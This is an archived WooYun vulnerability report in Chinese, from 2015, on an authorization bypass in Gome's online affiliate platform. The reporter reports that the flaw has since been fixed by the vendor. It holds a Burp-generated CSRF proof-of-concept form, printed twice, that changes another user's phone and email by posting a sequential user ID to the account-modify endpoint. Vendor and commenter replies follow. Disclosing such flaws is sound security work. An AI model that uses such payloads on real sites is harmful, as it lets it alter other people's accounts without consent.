{"id": 24833, "wybug_id": "wooyun-2015-0136130", "wybug_title": "国美在线销售联盟越权修改他人资料(沦陷7770+用户)未深入", "wybug_corp": "国美控股集团", "wybug_author": "Xenc", "wybug_date": "2015-08-23 12:49", "wybug_open_date": "2015-09-01 11:53", "wybug_type": "未授权访问/权限绕过", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经修复", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-08-23：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-08-24：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-09-01：\t厂商已经修复漏洞并主动公开，细节向公众公开  简要描述： 国美控股是中国的一家集团公司，总部位于北京密云县。项目投资管理；投资咨询；企业管理咨询；技术开发、技术转让、技术咨询、技术服务；房地产信息咨询（中介除外）。 详细说明：  国美在线销售联盟越权修改他人资料(沦陷7770+用户)未深入刚刚看了下 用户的SID是逐渐+1的 而我在测试的时候是7771 说明已经是7770+用户了已测试越权 修改别人资料首先注册一个用户,进入后打开个人资料,进入老版的为了保证漏洞存在我就不打马克赛了\n\n然后修改的时候用burp截包\n\n注明在图片写了然后我们在构造csrf代码如下\n<html>  <!-- CSRF PoC - generated by burp suite professional -->  <body>    <form action=\"http://cps.gome.com.cn/Settlement/AccountModify\" method=\"POST\">      <input type=\"hidden\" name=\"hidden&#95;id\" value=\"7771\" />      <input type=\"hidden\" name=\"input&#95;phone\" value=\"13531285169\" />      <input type=\"hidden\" name=\"input&#95;email\" value=\"testwooyun&#64;qq&#46;com\" />      <input type=\"hidden\" name=\"input&#95;phonenum\" value=\"13531285169\" />      <input type=\"hidden\" name=\"input&#95;qq\" value=\"13531285169\" />      <input type=\"hidden\" name=\"input&#95;msn\" value=\"13531285169\" />      <input type=\"submit\" value=\"Submit form\" />    </form>  </body></html>\n\n\n保存在html中用户ID我们在新版的那里看到我们的SID  ID就是SID我们在代码里面修改数据就可以了在这里我们修改一个用户的的资料,(我自己刚刚注册的)\n\n\n\n资料是不一样的, 我们修改成别的资料邮箱,手机号,等等我们去修改掉邮箱修改成 testwooyun@wooyun.com数据号码改成11111111113\n\n单击按钮 出现:\n\n修改成功 我们看看我们的资料有没有被修改\n\n成功修改了,我让我朋友注册了个用户我修改 案例如下:\n\n\n\n\n\n\n\n\n\n以上已经证明了可以越权修改别人的资料用户7770+ 不敢深入 但是证明了漏洞的存在求rnak   漏洞证明：  国美在线销售联盟越权修改他人资料(沦陷7770+用户)未深入刚刚看了下 用户的SID是逐渐+1的 而我在测试的时候是7771 说明已经是7770+用户了已测试越权 修改别人资料首先注册一个用户,进入后打开个人资料,进入老版的为了保证漏洞存在我就不打马克赛了\n\n然后修改的时候用burp截包\n\n注明在图片写了然后我们在构造csrf代码如下\n<html>  <!-- CSRF PoC - generated by burp suite professional -->  <body>    <form action=\"http://cps.gome.com.cn/Settlement/AccountModify\" method=\"POST\">      <input type=\"hidden\" name=\"hidden&#95;id\" value=\"7771\" />      <input type=\"hidden\" name=\"input&#95;phone\" value=\"13531285169\" />      <input type=\"hidden\" name=\"input&#95;email\" value=\"testwooyun&#64;qq&#46;com\" />      <input type=\"hidden\" name=\"input&#95;phonenum\" value=\"13531285169\" />      <input type=\"hidden\" name=\"input&#95;qq\" value=\"13531285169\" />      <input type=\"hidden\" name=\"input&#95;msn\" value=\"13531285169\" />      <input type=\"submit\" value=\"Submit form\" />    </form>  </body></html>\n\n\n保存在html中用户ID我们在新版的那里看到我们的SID  ID就是SID我们在代码里面修改数据就可以了在这里我们修改一个用户的的资料,(我自己刚刚注册的)\n\n\n\n资料是不一样的, 我们修改成别的资料邮箱,手机号,等等我们去修改掉邮箱修改成 testwooyun@wooyun.com数据号码改成11111111113\n\n单击按钮 出现:\n\n修改成功 我们看看我们的资料有没有被修改\n\n成功修改了,我让我朋友注册了个用户我修改 案例如下:\n\n\n\n\n\n\n\n\n\n以上已经证明了可以越权修改别人的资料用户7770+ 不敢深入 但是证明了漏洞的存在求rnak   修复方案：  权限 =_=！   版权声明：转载请注明来源 Xenc@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2015-08-24 16:07 厂商回复： 非常感谢提供的漏洞信息 最新状态： 2015-09-01：已修复  ", "replys": "漏洞评价：\n评论\n     2015-08-24 17:41 |    \t\tXenc \t\t\t( 实习白帽子  |\t\t\t        Rank:39 漏洞数:9        | 个人博客:www.hackang.com)\t\t \n  @疯狗  严重不服 怎么这个走小厂商了哇~ ~    \n     2015-09-10 22:38 |    \t\ti3esn0w \t\t\t( 实习白帽子  |\t\t\t        Rank:85 漏洞数:21        | 我是一个大白菜,很大很大的白菜)\t\t \n  这个属于csrf吧    \n     2015-09-17 16:13 |    \t\tpopok \t\t\t( 普通白帽子  |\t\t\t        Rank:117 漏洞数:24        | nothing)\t\t \n  @Xenc 是rank不是rnak，还有你这个直接在burp里改id，然后发送不就完了？@i3esn0w 这叫账户权限检查不严    \n     2015-09-17 23:01 |    \t\t神笔马良 \t\t\t( 普通白帽子  |\t\t\t        Rank:130 漏洞数:45        | 爱写字的马)\t\t \n  演示漏洞方法很奇特    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}